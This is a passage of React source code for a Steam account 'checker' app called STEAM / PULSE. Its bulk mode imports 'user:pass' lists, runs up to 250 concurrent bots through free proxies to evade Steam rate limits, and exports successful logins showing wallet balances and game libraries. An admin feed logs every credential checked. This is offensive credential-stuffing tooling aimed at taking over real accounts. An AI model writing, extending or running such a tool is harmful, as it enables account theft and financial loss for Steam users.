                    )}
                </div>
            )}

            <div className="bg-slate-900 border border-slate-800 rounded overflow-hidden flex flex-col flex-1 overflow-y-auto min-h-[500px]">
                <div className="p-4 bg-slate-950 border-b border-slate-800 flex flex-col md:flex-row justify-between items-center sticky top-0 z-10 gap-3">
                    <p className="text-[10px] uppercase font-bold tracking-[0.2em] flex items-center gap-2">
                        Live History Feed 
                        <span className="bg-slate-800 px-2 py-0.5 rounded text-cyan-400 font-mono">{allChecks.length}</span>
                    </p>
                    <div className="relative w-full md:w-64">
                        <Search className="w-3 h-3 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
                        <input 
                            type="text" 
                            placeholder="Search User or Game Title..." 
                            className="w-full bg-slate-900 border border-slate-800 rounded px-8 py-1.5 text-[10px] font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
                            value={adminGameSearch}
                            onChange={(e) => setAdminGameSearch(e.target.value)}
                        />
                    </div>
                </div>
                <div className="flex flex-col">
                    {filteredChecks.map(check => (
                        <div key={check.id} className="border-b border-slate-800/50 p-4 hover:bg-slate-950/50 flex flex-col md:flex-row gap-4 items-start md:items-center transition-colors">
                            <div className="flex items-center gap-3 w-full md:w-72 flex-shrink-0">
                                {check.avatar ? (
                                    <div className="w-10 h-10 bg-slate-800 border border-slate-700 flex-shrink-0">
                                       <img src={check.avatar} alt="" className="w-full h-full object-cover" />
                                    </div>
                                ) : (
                                    <div className="w-10 h-10 bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-600">
                                        <AlertCircle className="w-5 h-5" />
                                    </div>
                                )}
                                <div className="min-w-0">
                                    <p className="text-xs font-bold truncate text-slate-200 select-all">{check.credentials || check.steamId}</p>
                                    <p className="text-[9px] text-slate-500 font-mono mt-1 flex items-center gap-2">
                                        {check.timestamp instanceof Timestamp ? check.timestamp.toDate().toLocaleString() : 'Saving...'}
                                        {check.status === 'search' && <span className="text-[8px] bg-slate-800 text-slate-400 px-1 rounded">PUBLIC SEARCH</span>}
                                        {check.status === 'failed' && <span className="text-[8px] bg-rose-900/20 text-rose-400 px-1 rounded">AUTH FAILED</span>}
                                    </p>
                                </div>
                            </div>
                            
                            <div className="flex gap-6 items-center flex-1">
                                {check.status === 'success' ? (
                                    <>
                                        <div className="flex flex-col w-24">
                                            <p className="text-[8px] uppercase text-slate-600">Persona</p>
                                            <p className="text-[10px] text-slate-400 font-bold truncate">{check.personaName}</p>
                                        </div>
                                        <div className="flex flex-col w-16">
                                            <p className="text-[8px] uppercase text-slate-600">Library</p>
                                            <p className="text-[10px] text-cyan-500 font-mono font-bold tracking-widest">{check.gameCount} G</p>
                                        </div>
                                        <div className="flex flex-col w-12">
                                            <p className="text-[8px] uppercase text-slate-600">Value</p>
                                            <p className="text-[10px] text-emerald-500 font-mono font-bold">+{check.valueScore}</p>
                                        </div>
                                        <div className="flex flex-col w-20">
                                            <p className="text-[8px] uppercase text-slate-600">Wallet</p>
                                            <p className="text-[10px] text-amber-500 font-mono font-bold truncate">{check.walletBalance || '0.00'}</p>
                                        </div>
                                        {/* Match highlight */}
                                        {adminGameSearch && (check.gameNames || []).some((n:string) => n.toLowerCase().includes(adminGameSearch.toLowerCase())) && (
                                            <div className="flex-1 flex gap-2 overflow-x-auto custom-scrollbar pb-1">
                                                {(check.gameNames || [])
                                                    .filter((n:string) => n.toLowerCase().includes(adminGameSearch.toLowerCase()))
                                                    .slice(0, 3)
                                                    .map((n:string, idx:number) => (
                                                        <span key={idx} className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded text-[9px] font-mono whitespace-nowrap">
                                                            {n}
                                                        </span>
                                                    ))
                                                }
                                            </div>
                                        )}
                                    </>
                                ) : check.status === 'search' ? (
                                    <div className="flex items-center gap-4">
                                        <div className="flex flex-col">
                                            <p className="text-[8px] uppercase text-slate-600">Action</p>
                                            <p className="text-[10px] text-slate-400 font-bold uppercase">Profile Scrape</p>
                                        </div>
                                        <div className="flex flex-col">
                                            <p className="text-[8px] uppercase text-slate-600">Subject</p>
                                            <p className="text-[10px] text-slate-300 font-mono">{check.personaName}</p>
                                        </div>
                                    </div>
                                ) : (
                                    <div className="flex items-center gap-2 text-rose-500/60 bg-rose-500/5 px-3 py-1 rounded-full border border-rose-500/10">
                                        <AlertCircle className="w-3 h-3" />
                                        <span className="text-[9px] uppercase font-bold tracking-widest">Failed: {check.error || 'Unknown Error'}</span>
                                    </div>
                                )}
                            </div>
                        </div>
                    ))}
                    {filteredChecks.length === 0 && (
                        <div className="py-20 flex flex-col items-center text-slate-700 opacity-50">
                            <Clock className="w-12 h-12 mb-4" />
                            <p className="text-xs uppercase font-bold tracking-widest">No Signals Found</p>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans p-4 md:p-10 flex flex-col selection:bg-cyan-500/30">
      {/* Header Section */}
      <header className="flex flex-col md:flex-row justify-between items-start md:items-end border-b border-slate-800 pb-6 mb-6 gap-4">
        <div>
          <h1 className="text-xs tracking-[0.4em] uppercase text-cyan-500 font-bold mb-2">Database Query</h1>
          <h2 className="text-3xl md:text-4xl font-black tracking-tighter uppercase">
            STEAM <span className="text-slate-500 font-light">/</span> PULSE
          </h2>
        </div>
        <div className="flex flex-col md:items-end gap-2 text-right">
            <div className="flex bg-slate-900 border border-slate-800 rounded-sm p-1">
                <button 
                  onClick={() => setMode('single')}
                  className={`px-4 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${mode === 'single' ? 'bg-cyan-600 text-white' : 'text-slate-500 hover:text-slate-300'}`}
                >
                  Single
                </button>
                <button 
                  onClick={() => setMode('bulk')}
                  className={`px-4 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${mode === 'bulk' ? 'bg-cyan-600 text-white' : 'text-slate-500 hover:text-slate-300'}`}
                >
                  Bulk
                </button>
                {isAdmin && (
                    <button 
                      onClick={() => setMode('admin')}
                      className={`px-4 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${mode === 'admin' ? 'bg-emerald-600 text-white' : 'text-slate-500 hover:text-slate-300'}`}
                    >
                      Admin
                    </button>
                )}
            </div>
        </div>
      </header>

      {/* Main Content Area */}
      {mode === 'admin' ? renderAdminPanel() : mode === 'single' ? (
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 md:gap-8 flex-1 items-start">
        
        {/* Sidebar: Search & User Info */}
        <div className="lg:col-span-4 flex flex-col gap-6 h-full">
          {/* Search Box */}
          <div className="bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm shadow-xl">
            <label className="text-[10px] uppercase tracking-widest text-slate-400 block mb-3 font-semibold">
              Input Steam Identity or Credentials
            </label>
            <form onSubmit={handleSearch} className="flex flex-col md:flex-row gap-2">
              <input 
                type="text" 
                value={searchInput}
                onChange={(e) => setSearchInput(e.target.value)}
                placeholder="ID, URL, or user:pass"
                className="bg-slate-950 border border-slate-700 text-sm px-3 py-2 w-full font-mono focus:outline-none focus:border-cyan-500 placeholder:text-slate-700"
              />
              <button 
                disabled={loading}
                className="bg-cyan-600 hover:bg-cyan-500 px-6 py-2 text-xs font-bold uppercase tracking-tighter transition-colors disabled:bg-slate-800 min-w-[80px] flex items-center justify-center"
              >
                {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : 'Query'}
              </button>
            </form>
            {error && (
              <p className="mt-3 text-[10px] text-rose-500 font-mono uppercase tracking-tight">{error}</p>
            )}
          </div>

          {/* User Profile Snapshot */}
          <AnimatePresence mode="wait">
            {profile ? (
              <motion.div 
                key="profile-card"
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                className="bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm flex-1 relative overflow-hidden flex flex-col min-h-[300px] md:min-h-[400px]"
              >
                <div className="absolute top-0 right-0 p-4 hidden md:block">
                  <span className={`text-[9px] font-bold border px-2 py-0.5 rounded-full uppercase tracking-widest ${
                    profile.personastate > 0 ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20' : 'bg-slate-500/10 text-slate-500 border-slate-500/20'
                  }`}>
                    {getStatusText(profile.personastate)}
                  </span>
                </div>
                
                <div className="flex items-center gap-4 mb-6 md:mb-8">
                  <div className="w-16 h-16 md:w-20 md:h-20 bg-slate-800 border-2 border-slate-700 p-1 flex-shrink-0">
                    <img 
                      src={profile.avatarfull} 
                      alt={profile.personaname}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="min-w-0">
                    <h3 className="text-lg md:text-xl font-bold truncate tracking-tight">{profile.personaname}</h3>
                    <p className="text-[10px] text-cyan-500 uppercase tracking-widest mt-1">
                      ID: <span className="text-slate-400 font-mono">{profile.steamid.slice(-8)}</span>
                    </p>
                    <a 
                      href={profile.profileurl} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="text-[9px] text-slate-500 hover:text-cyan-400 transition-colors uppercase tracking-widest flex items-center gap-1 mt-1"
                    >
                      Steam Profile <ExternalLink className="w-2 h-2" />
                    </a>
                  </div>
                </div>

                {singleWalletBalance && (
                  <div className="mb-6 bg-gradient-to-r from-amber-900/30 to-orange-900/30 border border-amber-500/30 rounded p-3 flex items-center gap-3">
                    <span className="text-xl">💰</span>
                    <div>
                      <p className="text-[9px] uppercase tracking-widest text-amber-400 font-bold">Wallet Balance</p>
                      <p className="text-sm font-mono text-amber-300 mt-0.5">{singleWalletBalance}</p>
                    </div>
                  </div>
                )}

                <div className="space-y-4">
                  <div className="flex justify-between border-b border-slate-800 pb-2">
                    <span className="text-[10px] text-slate-500 uppercase tracking-widest">Library Count</span>
                    <span className="text-xs font-mono">{gameCount}</span>
                  </div>
                  {profile.timecreated > 0 && (
                    <div className="flex justify-between border-b border-slate-800 pb-2">
                      <span className="text-[10px] text-slate-500 uppercase tracking-widest">Member Since</span>
                      <span className="text-xs font-mono">{new Date(profile.timecreated * 1000).getFullYear()}</span>
                    </div>
                  )}
                  {profile.loccountrycode && (
                    <div className="flex justify-between border-b border-slate-800 pb-2">
                      <span className="text-[10px] text-slate-500 uppercase tracking-widest">Country</span>
                      <span className="text-xs font-mono">{profile.loccountrycode}</span>
                    </div>
                  )}
                </div>

                <div className="mt-auto pt-6 md:pt-8">
                  <div className="flex items-center gap-2 mb-3">
                    <div className="h-px bg-slate-800 flex-1"></div>
                    <span className="text-[9px] text-slate-600 uppercase font-mono">Summary</span>
                    <div className="h-px bg-slate-800 flex-1"></div>
                  </div>
                  <div className="flex justify-around gap-2">
                    <div className="text-center">
                      <p className="text-[8px] text-slate-600 uppercase">Games</p>
                      <p className="text-sm font-bold text-cyan-500 font-mono">{gameCount}</p>
                    </div>
                    <div className="text-center">
                      <p className="text-[8px] text-slate-600 uppercase">Status</p>
                      <p className="text-sm font-bold text-slate-300 font-mono">OK</p>
                    </div>
                  </div>
                </div>
              </motion.div>
            ) : (
              <div className="bg-slate-900/50 border border-slate-800 p-6 rounded-sm flex-1 flex flex-col items-center justify-center text-center mt-4 lg:mt-0 min-h-[200px]">
                <User className="w-10 h-10 md:w-12 md:h-12 text-slate-800 mb-4" />
                <p className="text-[10px] uppercase tracking-widest text-slate-600 font-bold">No Active Identity</p>
              </div>
            )}
          </AnimatePresence>
        </div>

        {/* Content: Games Library */}
        <div className="lg:col-span-8 bg-slate-900/50 border border-slate-800 rounded-sm flex flex-col h-[500px] md:h-[700px]">
          <div className="p-4 md:p-6 border-b border-slate-800 flex flex-col sm:flex-row justify-between sm:items-center gap-2 bg-slate-900">
            <h4 className="text-sm font-bold uppercase tracking-widest">Library Manifest</h4>
            <div className="flex gap-4">
              <span className="text-[9px] text-slate-500 uppercase tracking-tight font-mono">TOTAL: {games.length}</span>
              <span className="text-[9px] text-cyan-500 uppercase tracking-tight font-mono">FILTER: PLAYED</span>
            </div>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-2 p-2 md:p-4 gap-2 md:gap-4 overflow-y-auto custom-scrollbar flex-1 min-h-0 content-start auto-rows-max">
            {games.length > 0 ? (
              games
                .sort((a, b) => (b.playtime_forever || 0) - (a.playtime_forever || 0))
                .map((game) => (
                  <motion.div 
                    initial={{ opacity: 0, y: 5 }}
                    animate={{ opacity: 1, y: 0 }}
                    key={game.appid} 
                    className="flex gap-3 md:gap-4 p-2 md:p-3 bg-slate-950/80 border border-slate-800 group hover:bg-slate-900 hover:border-cyan-600/50 transition-all duration-300 relative overflow-hidden items-center"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/0 via-cyan-500/0 to-cyan-500/10 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>
                    <div className="w-20 h-10 md:w-28 md:h-14 lg:w-32 lg:h-16 bg-slate-900 flex-shrink-0 border border-slate-800 overflow-hidden relative shadow-lg">
                      <img 
                        src={`https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/${game.appid}/header.jpg`}
                        alt={game.name}
                        className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement;
                          if (!target.dataset.triedFallback) {
                            target.dataset.triedFallback = 'true';
                            target.src = game.logo_url && game.logo_url.includes('http') 
                                ? game.logo_url 
                                : `https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/${game.appid}/capsule_184x69.jpg`;
                          } else if (!target.dataset.triedFallback2 && game.img_icon_url) {
                            target.dataset.triedFallback2 = 'true';
                            target.src = game.img_icon_url.includes('http') 
                                ? game.img_icon_url 
                                : `https://media.steampowered.com/steamcommunity/public/images/apps/${game.appid}/${game.img_icon_url}.jpg`;
                          } else {
                            target.src = 'https://steamcommunity-a.akamaihd.net/public/images/applications/store/default.png';
                          }
                        }}
                      />
                    </div>
                    <div className="flex flex-col justify-center overflow-hidden flex-1 min-w-0 relative z-10">
                      <h5 className="text-xs md:text-sm font-bold truncate group-hover:text-cyan-400 transition-colors">{game.name}</h5>
                      <p className="text-[9px] md:text-[10px] text-slate-500 font-mono mt-0.5">
                        {Math.round((game.playtime_forever || 0) / 60)} hrs on record
                      </p>
                      <p className="text-[8px] md:text-[9px] text-cyan-700 mt-0.5 uppercase tracking-tighter hidden sm:block">APP_ID: {game.appid}</p>
                    </div>
                  </motion.div>
                ))
            ) : profile ? (
              <div className="col-span-1 md:col-span-2 flex flex-col items-center justify-center py-20 text-slate-600 opacity-50">
                <Gamepad2 className="w-10 h-10 md:w-12 md:h-12 mb-4" />
                <p className="text-[9px] md:text-[10px] uppercase tracking-widest font-bold">Access Restricted / No Data</p>
              </div>
            ) : (
              <div className="col-span-1 md:col-span-2 flex flex-col items-center justify-center py-20 text-slate-800">
                <Search className="w-12 h-12 md:w-16 md:h-16 mb-4 opacity-50" />
                <p className="text-[9px] md:text-[10px] uppercase tracking-widest font-bold">Awaiting Selection Data</p>
              </div>
            )}
          </div>

          {/* Summary Stats Footer */}
          {games.length > 0 && (
            <div className="mt-auto p-4 md:p-6 bg-slate-900 border-t border-slate-800 flex justify-around">
              <div className="text-center">
                <p className="text-[8px] md:text-[9px] uppercase text-slate-500 mb-1 tracking-widest">Playtime</p>
                <p className="text-sm md:text-lg font-bold text-cyan-500 font-mono">
                  {Math.round(games.reduce((acc, g) => acc + (g.playtime_forever || 0), 0) / 60)}H
                </p>
              </div>
              <div className="w-px bg-slate-800"></div>
              <div className="text-center">
                <p className="text-[8px] md:text-[9px] uppercase text-slate-500 mb-1 tracking-widest">Library Size</p>
                <p className="text-sm md:text-lg font-bold font-mono">{games.length}</p>
              </div>
              <div className="w-px bg-slate-800"></div>
              <div className="text-center">
                <p className="text-[8px] md:text-[9px] uppercase text-slate-500 mb-1 tracking-widest">Security</p>
                <p className="text-sm md:text-lg font-bold text-emerald-500 italic font-mono uppercase">Clean</p>
              </div>
            </div>
          )}
        </div>
      </div>
      ) : (
      // Bulk Mode
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 md:gap-8 flex-1 items-start">
        <div className="lg:col-span-4 flex flex-col gap-6 h-full">
            <div className="bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm shadow-xl">
                <label className="text-[10px] uppercase tracking-widest text-slate-400 block mb-3 font-semibold">
                    Bulk Account Import (.txt)
                </label>
                <div className="relative border-2 border-dashed border-slate-700 bg-slate-950/50 hover:bg-slate-950 hover:border-cyan-500 transition-colors p-6 rounded text-center cursor-pointer min-h-[120px] flex flex-col items-center justify-center">
                    <input 
                        type="file" 
                        accept=".txt" 
                        onChange={handleFileUpload} 
                        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                    />
                    <Upload className="w-8 h-8 text-slate-600 mb-2" />
                    <p className="text-xs text-slate-400 font-mono">Click or Drag .txt file</p>
                    <p className="text-[9px] text-slate-600 mt-1 uppercase tracking-widest">Format: user:pass per line</p>
                </div>
                
                <div className="mt-4 flex gap-2 flex-col sm:flex-row">
                    {!isCheckingBulk ? (
                        <button 
                            onClick={startBulkCheck}
                            disabled={bulkAccounts.length === 0}
                            className="flex-1 bg-cyan-600 hover:bg-cyan-500 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors disabled:bg-slate-800 disabled:text-slate-500 flex items-center justify-center gap-2"
                        >
                            <Play className="w-3 h-3" /> Start Checker
                        </button>
                    ) : (
                        <button 
                            onClick={stopBulkCheck}
                            className="flex-1 bg-rose-600 hover:bg-rose-500 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors flex items-center justify-center gap-2"
                        >
                            <Square className="w-3 h-3" /> Stop
                        </button>
                    )}
                    <button 
                        onClick={clearBulkAccounts}
                        disabled={isCheckingBulk || bulkAccounts.length === 0}
                        className="bg-slate-800 hover:bg-slate-700 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors disabled:opacity-50"
                    >
                        Clear
                    </button>
                    <button
                        onClick={downloadResults}
                        disabled={bulkAccounts.filter(a => a.status === 'success').length === 0}
                        className="bg-emerald-600/20 text-emerald-500 border border-emerald-500/20 hover:bg-emerald-600/30 px-4 py-2 text-xs font-bold uppercase tracking-tighter transition-colors disabled:opacity-50 flex items-center justify-center gap-1"
                    >
                        <Download className="w-3 h-3" /> Export
                    </button>
                </div>

                <div className="mt-4 border-t border-slate-800 pt-4">
                    <div className="flex justify-between items-center mb-2">
                      <label className="text-[9px] uppercase tracking-widest text-slate-500 font-semibold">
                          Proxies (Optional)
                      </label>
                      <button 
                        onClick={loadFreeProxies}
                        disabled={isLoadingProxies || isCheckingBulk}
                        className="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded font-mono uppercase tracking-widest transition-colors flex items-center gap-1 disabled:opacity-50"
                      >
                         {isLoadingProxies ? <Loader2 className="w-3 h-3 animate-spin"/> : null} 
                         Auto Load Free API
                      </button>
                    </div>
                    <textarea 
                        value={proxies}
                        onChange={(e) => setProxies(e.target.value)}
                        placeholder="http://user:pass@ip:port&#10;socks5://ip:port"
                        className="w-full bg-slate-950/50 border border-slate-700 text-xs px-3 py-2 font-mono h-24 rounded focus:outline-none focus:border-cyan-500 placeholder:text-slate-700"
                    ></textarea>
                </div>
                
                <div className="mt-4 border-t border-slate-800 pt-4">
                    <label className="text-[9px] uppercase tracking-widest text-slate-500 block mb-2 font-semibold">
                        Concurrency Tasks (Bots)
                    </label>
                    <div className="flex flex-wrap gap-2">
                        {[1, 10, 50, 100, 200, 250].map(n => (
                            <button
                                key={n}
                                onClick={() => setBotCount(n)}
                                disabled={isCheckingBulk}
                                className={`flex-1 py-1.5 text-[10px] font-mono border rounded-sm transition-colors ${botCount === n ? 'border-cyan-500 bg-cyan-500/20 text-cyan-400' : 'border-slate-800 bg-slate-950/50 text-slate-500 hover:border-slate-600 disabled:opacity-50 disabled:hover:border-slate-800'}`}
                            >
                                {n}
                            </button>
                        ))}
                    </div>
                </div>
            </div>
            
            <div className="bg-slate-900 border border-slate-800 p-4 md:p-6 rounded-sm flex-1">
                <h3 className="text-[10px] uppercase tracking-widest text-slate-500 block mb-4 border-b border-slate-800 pb-2">Guidelines</h3>
                <ul className="text-[10px] text-slate-400 space-y-2 uppercase tracking-wide font-mono list-disc pl-4">
                    <li>Rate limiting applies on the server. Checks occur iteratively.</li>
                    <li>Accounts requiring 2FA will report as "Failed".</li>
                    <li>Success yields library metadata.</li>
                    <li>High bot counts (100+) require high-quality proxies to avoid Steam rate limits.</li>
                    <li>Search functions locally on successful accounts.</li>
                </ul>
            </div>
        </div>
        
        {/* Bulk Listing and Searching */}
        <div className="lg:col-span-8 h-full flex">
            {renderBulkResults()}
        </div>
      </div>
      )}

      {/* Footer Grid Line */}
      <footer className="mt-8 text-[9px] font-mono text-slate-700 flex justify-between items-center border-t border-slate-900/50 pt-4">
        <p>SECURE_ENCRYPTION_HASH: 0x{profile?.steamid ? parseInt(profile.steamid.slice(-8)).toString(16).toUpperCase() : '88A22F91'}</p>
        <p>© 2026 STEAM_PULSE_NETWORK</p>
      </footer>

      {/* Admin Floating Trigger */}
      {!isAdmin && (
          <button 
            onClick={handleAdminLogin}
            disabled={isAdminLoading}
            className="fixed bottom-4 right-4 p-3 bg-slate-900/80 hover:bg-slate-900 border border-slate-800 rounded-full text-slate-600 hover:text-cyan-500 transition-all opacity-80 hover:opacity-100 group shadow-2xl disabled:opacity-50"
            title="Admin Login"
          >
            {isAdminLoading ? (
               <Loader2 className="w-5 h-5 animate-spin text-cyan-500" />
            ) : (
               <Shield className="w-5 h-5 group-hover:scale-110 transition-transform" />
            )}
          </button>
      )}

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(15, 23, 42, 0.1); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1e293b; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #334155; }
      `}} />
    </div>
  );
}


